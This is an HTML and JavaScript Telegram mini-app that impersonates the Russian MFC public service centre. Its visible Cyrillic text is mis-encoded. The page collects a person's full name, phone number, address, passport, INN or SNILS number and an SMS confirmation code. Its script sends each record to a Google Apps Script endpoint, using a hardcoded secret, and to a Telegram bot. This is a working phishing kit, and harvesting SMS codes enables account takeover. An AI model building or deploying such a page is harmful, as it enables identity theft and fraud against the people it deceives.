<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>–ú–§–¶ ‚Äî –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    :root{--primary-color:#800000;--secondary-color:#660000;--info-color:#990000;--error-color:#B22222;--background-color:#F5E6E6;--white:#fff;--text-color:#333;--shadow:0 4px 12px rgba(128,0,0,.3);--input-bg:#EADADA;--input-border:#990000;--table-header-bg:linear-gradient(90deg,#800000,#660000)}
    *{box-sizing:border-box;margin:0;padding:0}
    body{font-family:'Segoe UI',Arial,sans-serif;background:var(--background-color);padding:20px;display:flex;justify-content:center;min-height:100vh}
    .container{max-width:520px;width:100%;background:var(--white);padding:30px;border-radius:16px;box-shadow:var(--shadow);text-align:center}
    .step{display:none;text-align:left}.step.active{display:block}
    h2,h3{margin-bottom:20px;font-weight:700;font-size:1.6em;color:var(--primary-color);display:flex;align-items:center;gap:10px;line-height:1.3}
    p{margin-bottom:14px}
    .input-group{margin-bottom:20px;text-align:left;display:flex;flex-direction:column}
    input{width:100%;padding:12px 15px;margin-top:8px;border:2px solid var(--input-border);border-radius:10px;font-size:16px;background:var(--input-bg);box-shadow:0 2px 6px rgba(0,0,0,.1);transition:border-color .3s,box-shadow .3s}
    input:focus{outline:none;border-color:var(--primary-color);box-shadow:0 4px 12px rgba(128,0,0,.2)}
    .error{color:var(--error-color);font-size:14px;margin-top:6px;font-weight:600;text-align:left;min-height:1.2em}
    .buttons{margin-top:20px;display:flex;flex-direction:column;gap:12px}
    button{width:100%;padding:14px;border:none;border-radius:10px;cursor:pointer;font-size:16px;font-weight:600;transition:background-color .3s,transform .1s;text-align:center;color:var(--white);user-select:none}
    button:hover{transform:translateY(-2px)}button:disabled{background:#ccc;cursor:not-allowed}
    .next{background:var(--primary-color)}.back{background:var(--secondary-color)}.menu-btn{background:var(--info-color)}
    .data-table{margin-top:20px;width:100%;border-collapse:collapse;display:none;background:var(--white);border-radius:10px;overflow:hidden}
    .data-table.active{display:table}
    .data-table th,.data-table td{border:1px solid var(--input-border);padding:12px 14px;text-align:left;font-size:14px}
    .data-table th{background:var(--table-header-bg);color:var(--white);font-weight:700;text-transform:uppercase}
    .data-table tr{transition:background-color .3s}.data-table tr:hover{background-color:#F9F5F5}.data-table tr:nth-child(even){background-color:#F5EDED}
    .loading{display:none;color:var(--primary-color);font-size:14px;margin-top:10px}
  </style>
</head>
<body>
  <div class="container">
    <div id="wizard">
      <div class="step active" id="step-main">
        <h2 id="welcome-message">üìã –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, üëã</h2>
        <p>–ì–æ—Ç–æ–≤—ã –Ω–∞—á–∞—Ç—å –æ—Ñ–æ—Ä–º–ª–µ–Ω–∏–µ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ –ø–æ –º–µ—Å—Ç—É –∂–∏—Ç–µ–ª—å—Å—Ç–≤–∞?</p>
        <div class="buttons">
          <button type="button" class="menu-btn" data-action="schedule">üìã –ó–∞–ø–∏—Å–∞—Ç—å—Å—è –Ω–∞ –ø—Ä–∏—ë–º</button>
          <button type="button" class="menu-btn" data-action="documents">üìú –°–ø–∏—Å–æ–∫ –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤</button>
          <button type="button" class="menu-btn" data-action="check-status">üîç –ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Å—Ç–∞—Ç—É—Å –∑–∞—è–≤–∫–∏</button>
          <button type="button" class="menu-btn" data-action="contact">üìû –°–≤—è–∑–∞—Ç—å—Å—è —Å –ø–æ–¥–¥–µ—Ä–∂–∫–æ–π</button>
          <button type="button" class="menu-btn" data-action="faq">‚ùì –ß–∞—Å—Ç—ã–µ –≤–æ–ø—Ä–æ—Å—ã</button>
          <button type="button" class="menu-btn" data-action="show-data">üìä –ú–æ–∏ –¥–∞–Ω–Ω—ã–µ</button>
        </div>
      </div>

      <div class="step" id="step-fullname">
        <h3>üë§ –£–∫–∞–∂–∏—Ç–µ –§–ò–û</h3>
        <div class="input-group">
          <input type="text" id="fullname" placeholder="–ò–≤–∞–Ω–æ–≤ –ò–≤–∞–Ω –ò–≤–∞–Ω–æ–≤–∏—á" autocomplete="name">
          <div class="error" id="err-fullname"></div>
        </div>
        <div class="buttons">
          <button type="button" class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button type="button" class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <div class="step" id="step-phone">
        <h3>üìû –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</h3>
        <div class="input-group">
          <input type="tel" id="phone" placeholder="+79991234567" inputmode="tel" autocomplete="tel">
          <div class="error" id="err-phone"></div>
        </div>
        <div class="buttons">
          <button type="button" class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button type="button" class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <div class="step" id="step-address">
        <h3>üè† –£–∫–∞–∂–∏—Ç–µ –∞–¥—Ä–µ—Å</h3>
        <div class="input-group">
          <input type="text" id="address" placeholder="–≥. –ú–æ—Å–∫–≤–∞, —É–ª. –õ–µ–Ω–∏–Ω–∞, –¥. 1, –∫–≤. 2" autocomplete="address-line1">
          <div class="error" id="err-address"></div>
        </div>
        <div class="buttons">
          <button type="button" class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button type="button" class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <div class="step" id="step-document-type">
        <h3>üìÑ –í—ã–±–µ—Ä–∏—Ç–µ –¥–æ–∫—É–º–µ–Ω—Ç</h3>
        <div class="buttons">
          <button type="button" class="menu-btn" data-doc="–ü–∞—Å–ø–æ—Ä—Ç">üìÑ –ü–∞—Å–ø–æ—Ä—Ç</button>
          <button type="button" class="menu-btn" data-doc="–ò–ù–ù">üßæ –ò–ù–ù</button>
          <button type="button" class="menu-btn" data-doc="–°–ù–ò–õ–°">üü¢ –°–ù–ò–õ–°</button>
        </div>
        <div class="buttons"><button type="button" class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button></div>
      </div>

      <div class="step" id="step-document-number">
        <h3 id="doc-title">üî¢ –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞</h3>
        <div class="input-group">
          <div id="doc-example" style="margin-bottom:8px;color:#333;font-size:15px;"></div>
          <input type="text" id="docnumber" placeholder="4510 123456">
          <div class="error" id="err-doc"></div>
        </div>
        <div class="buttons">
          <button type="button" class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button type="button" class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <div class="step" id="step-code">
        <h3>üîê –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ SMS</h3>
        <div class="input-group">
          <input type="text" id="code" placeholder="1234" inputmode="numeric" pattern="\d*">
          <div class="error" id="err-code"></div>
        </div>
        <div class="buttons">
          <button type="button" class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button type="button" class="next">‚û°Ô∏è –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
          <div class="loading" id="loading">–û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö...</div>
        </div>
      </div>

      <div id="data-output" class="data-table">
        <h3>üìã –°–æ–±—Ä–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ</h3>
        <button type="button" class="menu-btn" id="clear-data">üóëÔ∏è –û—á–∏—Å—Ç–∏—Ç—å –¥–∞–Ω–Ω—ã–µ</button>
        <table>
          <thead>
            <tr><th>–í—Ä–µ–º—è</th><th>–§–ò–û</th><th>–¢–µ–ª–µ—Ñ–æ–Ω</th><th>–ê–¥—Ä–µ—Å</th><th>–î–æ–∫—É–º–µ–Ω—Ç</th><th>–ö–æ–¥</th></tr>
          </thead>
          <tbody id="data-table-body"></tbody>
        </table>
      </div>
    </div>
  </div>

  <script>
    let __lastSent = "";
    function sendToBotOnce(rec) {
      const tg = window.Telegram?.WebApp;
      const loading = document.getElementById("loading");
      if (loading) loading.style.display = "block";
      if (!tg) {
        console.log("Telegram WebApp not available, saving locally");
        alert("–î–∞–Ω–Ω—ã–µ —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã –ª–æ–∫–∞–ª—å–Ω–æ:\n" + JSON.stringify(rec, null, 2));
        if (loading) loading.style.display = "none";
        return;
      }
      try {
        const json = JSON.stringify({ type: "lead", payload: rec });
        if (json === __lastSent) {
          if (loading) loading.style.display = "none";
          return;
        }
        tg.ready();
        tg.sendData(json);
        tg.HapticFeedback?.impactOccurred?.("light");
        __lastSent = json;
        console.log("Data sent to Telegram:", json);
        if (loading) loading.style.display = "none";
      } catch (e) {
        console.error("sendData error:", e);
        alert("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –¥–∞–Ω–Ω—ã—Ö. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.");
        if (loading) loading.style.display = "none";
      }
    }

    class MFCWizard {
      constructor() {
        this.steps = document.querySelectorAll(".step");
        this.currentStep = "main";
        this.formData = {};
        this.dataStore = this.loadData();
        this.initEvents();
        this.updateWelcome();
        this.renderTable();
        this.show("main");
      }

      initEvents() {
        const root = document.getElementById("wizard");
        if (!root) { console.error("Wizard container not found"); return; }
        root.addEventListener("click", (e) => {
          const t = e.target.closest("button");
          if (!t) return;
          if (t.classList.contains("next")) this.next();
          else if (t.classList.contains("back")) this.back();
          else if (t.classList.contains("menu-btn")) this.menu(t.dataset.action, t.dataset.doc);
          else if (t.id === "clear-data") this.clearData();
        });
        ["fullname","phone","address","docnumber","code"].forEach((id)=>{
          const el=document.getElementById(id);
          if (el){
            el.addEventListener("input",()=>this.validate(this.currentStep));
            el.addEventListener("keypress",(e)=>{ if(e.key==="Enter"){ e.preventDefault(); this.next(); }});
          }
        });
      }

      loadData(){
        try{ const data = localStorage.getItem("mfcData"); return data? JSON.parse(data):[]; }
        catch(e){ console.error("Error loading data from localStorage:",e); return []; }
      }
      saveData(){ try{ localStorage.setItem("mfcData", JSON.stringify(this.dataStore)); } catch(e){ console.error("Error saving data:",e); } }
      clearData(){
        if(confirm("–û—á–∏—Å—Ç–∏—Ç—å –≤—Å–µ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ?")){
          this.dataStore=[]; this.saveData(); this.renderTable();
          document.getElementById("data-output").classList.remove("active");
          alert("–î–∞–Ω–Ω—ã–µ –æ—á–∏—â–µ–Ω—ã!");
        }
      }

      updateWelcome(){
        const el=document.getElementById("welcome-message"); const tg=window.Telegram?.WebApp;
        let name="–ì–æ—Å—Ç—å";
        try{
          const u=tg?.initDataUnsafe?.user;
          if(u) name=[u.first_name,u.last_name].filter(Boolean).join(" ")||u.username||"–ì–æ—Å—Ç—å";
        }catch(e){ console.warn("Error accessing Telegram user data:",e); }
        if(el) el.textContent=`üìã –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, ${name}! üëã`;
      }

      show(id){
        this.steps.forEach((s)=>s.classList.toggle("active", s.id===`step-${id}`));
        this.currentStep=id;
        ["err-fullname","err-phone","err-address","err-doc","err-code"].forEach((eid)=>{
          const el=document.getElementById(eid); if(el) el.textContent="";
        });
        window.scrollTo({top:0,behavior:"smooth"});
        const input=document.querySelector(`#step-${id} input`); if(input) input.focus();
      }

      next(){
        if(!this.validate(this.currentStep)) return;
        if(this.currentStep==="fullname"){ this.formData.fullname=(document.getElementById("fullname").value||"").trim(); return this.show("phone"); }
        if(this.currentStep==="phone"){ this.formData.phone=(document.getElementById("phone").value||"").trim(); return this.show("address"); }
        if(this.currentStep==="address"){ this.formData.address=(document.getElementById("address").value||"").trim(); return this.show("document-type"); }
        if(this.currentStep==="document-number"){ this.formData["document-number"]=(document.getElementById("docnumber").value||"").trim(); return this.show("code"); }
        if(this.currentStep==="code"){ this.formData.code=(document.getElementById("code").value||"").trim(); return this.send(); }
      }

      back(){
        const map={ fullname:"main", phone:"fullname", address:"phone", "document-type":"address", "document-number":"document-type", code:"document-number" };
        this.show(map[this.currentStep]||"main");
      }

      menu(action,doc){
        if(action==="schedule") return this.show("fullname");
        if(action==="documents") return alert("–°–ø–∏—Å–æ–∫ –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤: –ü–∞—Å–ø–æ—Ä—Ç, –ò–ù–ù, –°–ù–ò–õ–°, –≤—ã–ø–∏—Å–∫–∞ –ï–ì–†–ù.");
        if(action==="check-status") return alert("–ü—Ä–æ–≤–µ—Ä–∫–∞ —Å—Ç–∞—Ç—É—Å–∞ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞ –≤ –¥–µ–º–æ.");
        if(action==="contact"){ try{ window.location.href="https://t.me/MFC_SUPPORT"; } catch(e){ console.error("Error navigating:",e); alert("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–µ—Ä–µ—Ö–æ–¥–µ –∫ –ø–æ–¥–¥–µ—Ä–∂–∫–µ. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞."); } return; }
        if(action==="faq") return alert("FAQ –≤ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ.");
        if(action==="show-data"){
          const dataOutput=document.getElementById("data-output");
          if(dataOutput) dataOutput.classList.add("active");
          const last=this.dataStore[this.dataStore.length-1];
          if(last) sendToBotOnce(last);
          return;
        }
        if(doc){
          this.formData["document-type"]=doc;
          const ex={ –ü–∞—Å–ø–æ—Ä—Ç:"–ü—Ä–∏–º–µ—Ä: 4510 123456", –ò–ù–ù:"–ü—Ä–∏–º–µ—Ä: 500100732259", –°–ù–ò–õ–°:"–ü—Ä–∏–º–µ—Ä: 112-233-445 95" };
          const docExample=document.getElementById("doc-example"); if(docExample) docExample.textContent=ex[doc]||"";
          const docTitle=document.getElementById("doc-title"); if(docTitle) docTitle.textContent=`üî¢ –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞ (${doc})`;
          return this.show("document-number");
        }
      }

      validate(step){
        const e=(id)=>document.getElementById(id);
        if(step==="fullname"){
          const v=(e("fullname")?.value||"").trim();
          if(!v||v.split(" ").length<2){ e("err-fullname").textContent="–£–∫–∞–∂–∏—Ç–µ –∏–º—è –∏ —Ñ–∞–º–∏–ª–∏—é"; return false; }
          e("err-fullname").textContent=""; return true;
        }
        if(step==="phone"){
          const v=(e("phone")?.value||"").trim();
          if(!/^\+?\d[\d\s\-()]{6,}$/.test(v)){ e("err-phone").textContent="–£–∫–∞–∂–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π —Ç–µ–ª–µ—Ñ–æ–Ω (7+ —Ü–∏—Ñ—Ä)"; return false; }
          e("err-phone").textContent=""; return true;
        }
        if(step==="address"){
          const v=(e("address")?.value||"").trim();
          if(!v||v.length<5){ e("err-address").textContent="–£–∫–∞–∂–∏—Ç–µ –∞–¥—Ä–µ—Å (–≥–æ—Ä–æ–¥, —É–ª–∏—Ü–∞, –¥–æ–º)"; return false; }
          e("err-address").textContent=""; return true;
        }
        if(step==="document-number"){
          const v=(e("docnumber")?.value||"").trim();
          const docType=this.formData["document-type"]||"";
          if(!v){ e("err-doc").textContent="–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞"; return false; }
          if(docType==="–ü–∞—Å–ø–æ—Ä—Ç" && !/^\d{4}\s?\d{6}$/.test(v)){ e("err-doc").textContent="–ü–∞—Å–ø–æ—Ä—Ç: 4 —Ü–∏—Ñ—Ä—ã, 6 —Ü–∏—Ñ—Ä"; return false; }
          if(docType==="–ò–ù–ù" && !/^\d{12}$/.test(v)){ e("err-doc").textContent="–ò–ù–ù: 12 —Ü–∏—Ñ—Ä"; return false; }
          if(docType==="–°–ù–ò–õ–°" && !/^\d{3}-\d{3}-\d{3}\s?\d{2}$/.test(v)){ e("err-doc").textContent="–°–ù–ò–õ–°: XXX-XXX-XXX XX"; return false; }
          e("err-doc").textContent=""; return true;
        }
        if(step==="code"){
          const v=(e("code")?.value||"").trim();
          if(!/^\d{4}$/.test(v)){ e("err-code").textContent="–ö–æ–¥: 4 —Ü–∏—Ñ—Ä—ã"; return false; }
          e("err-code").textContent=""; return true;
        }
        return true;
      }

      // –æ—Ç–ø—Ä–∞–≤–∫–∞ –≤ Sheets ‚Üí –±–æ—Ç ‚Üí –ª–æ–∫–∞–ª—å–Ω–æ–µ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ
      async send(){
        const rec = {
          timestamp: new Date().toISOString().slice(0,19).replace("T"," "),
          fullname: this.formData.fullname || "",
          phone:    this.formData.phone || "",
          address:  this.formData.address || "",
          document: `${this.formData["document-type"]||""} ${this.formData["document-number"]||""}`.trim(),
          code:     this.formData.code || ""
        };

        if (this.dataStore.some(r => JSON.stringify(r) === JSON.stringify(rec))) {
          alert("–î–∞–Ω–Ω—ã–µ —É–∂–µ –±—ã–ª–∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã!");
          return;
        }

        try { await sendToSheet(rec); } catch (err) { console.warn("sendToSheet error:", err); }

        sendToBotOnce(rec);

        this.dataStore.push(rec);
        this.saveData();
        this.renderTable();
        const dataOutput=document.getElementById("data-output");
        if (dataOutput) dataOutput.classList.add("active");
        this.formData={};
        this.show("main");
        alert("–î–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã!");
      }

      renderTable(){
        const tbody=document.getElementById("data-table-body");
        if(!tbody) return;
        tbody.innerHTML="";
        this.dataStore.forEach((r)=>{
          const tr=document.createElement("tr");
          tr.innerHTML=`<td>${r.timestamp}</td><td>${r.fullname}</td><td>${r.phone}</td><td>${r.address}</td><td>${r.document}</td><td>${r.code}</td>`;
          tbody.appendChild(tr);
        });
      }
    }

    try { new MFCWizard(); }
    catch(e){ console.error("Failed to initialize MFCWizard:",e); alert("–û—à–∏–±–∫–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏. –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É."); }
  </script>

  <!-- –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Google Sheets (–±–µ–∑ preflight) -->
 <script>
  // –í–°–¢–ê–í–¨ —Å—é–¥–∞ URL –∏–∑ –†–∞–∑–≤–µ—Ä—Ç—ã–≤–∞–Ω–∏–π Apps Script (—Å—Ç—Ä–æ–≥–æ –∑–∞–∫–∞–Ω—á–∏–≤–∞–µ—Ç—Å—è –Ω–∞ /exec)
  const SHEETS_WEBAPP_URL = "https://script.google.com/macros/s/AKfyc...–¢–í–û–ô_ID.../exec";

  // –¢–æ—á–Ω–æ —Ç–∞–∫–æ–π –∂–µ —Å–µ–∫—Ä–µ—Ç, –∫–∞–∫ –≤ Code.gs
  const SECRET = "benhillworkspeisworkhab";

  async function sendToSheet(rec) {
    const payload = JSON.stringify({ type: "lead", payload: rec, secret: SECRET });
    const loading = document.getElementById("loading");
    if (loading) loading.style.display = "block";
    try {
      const res = await fetch(SHEETS_WEBAPP_URL, {
        method: "POST",
        headers: { "Content-Type": "text/plain;charset=utf-8" }, // –±–µ–∑ preflight
        body: payload
      });
      const text = await res.text();
      let data = {}; try { data = JSON.parse(text); } catch {}
      if (!res.ok || !data.ok) throw new Error(data.error || text || "request failed");
      if (data.duplicate) alert("‚ö†Ô∏è –¢–∞–∫–∞—è –∑–∞–ø–∏—Å—å —É–∂–µ –µ—Å—Ç—å.");
      else alert("‚úÖ –î–∞–Ω–Ω—ã–µ –∑–∞–ø–∏—Å–∞–Ω—ã –≤ —Ç–∞–±–ª–∏—Ü—É.");
    } catch (err) {
      console.warn("sendToSheet error:", err);
    } finally {
      if (loading) loading.style.display = "none";
    }
  }
</script>

</body>
</html>
